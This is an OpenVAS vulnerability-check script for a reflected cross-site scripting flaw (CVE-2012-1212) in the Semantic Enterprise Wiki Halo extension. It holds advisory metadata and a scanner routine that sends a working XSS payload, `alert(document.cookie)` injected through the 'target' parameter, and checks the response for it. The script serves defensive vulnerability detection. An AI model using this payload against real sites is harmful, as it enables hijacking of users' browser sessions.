###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_semantic_ent_wiki_target_param_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Semantic Enterprise Wiki Halo Extension 'target' XSS Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site.
  Impact Level: Application";
tag_affected = "Semantic Enterprise Wiki (SMW+) 1.6.0_2 and earlier";
tag_insight = "The flaw is due to an input passed via the 'target' parameter to
  'index.php/Special:FormEdit' is not properly sanitised in the
  'smwfOnSfSetTargetName()' function before being returned to the user.";
tag_solution = "No solution or patch is available as of 16th March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.smwplus.com/index.php/Semantic_MediaWiki_Plus";
tag_summary = "This host is running Semantic Enterprise Wiki and is prone to cross-site
  scripting vulnerability.";

if(description)
{
  script_id(802709);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1212");
  script_bugtraq_id(51980);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-16 16:34:28 +0530 (Fri, 16 Mar 2012)");
  script_name("Semantic Enterprise Wiki Halo Extension 'target' XSS Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47968");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51980");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/73167");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/109637/SMW-1.5.6-Cross-Site-Scripting.html");

  script_description(desc);
  script_summary("Check if Semantic Enterprise Wiki is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
dir = "";
sndReq = "";
rcvRes = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("", "/mediawiki", "/smw", cgi_dirs()))
{
  ## Confirm the application
  sndReq = http_get(item: string(dir, "/index.php/Main_Page"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if("SMW" >< rcvRes && "semantic enterprise wiki" >< rcvRes)
  {
    ## Construct the Attack Request
    url = dir + "/index.php/Special:FormEdit?target='%3Balert(" +
                "document.cookie)%2F%2F\&categories=Calendar+";

    ## Try attack and check the response to confirm vulnerability.
    if(http_vuln_check(port:port, url:url, pattern:";alert(document.cookie" +
                       ")\/\/\\'", check_header:TRUE))
    {
      security_warning(port);
      exit(0);
    }
  }
}
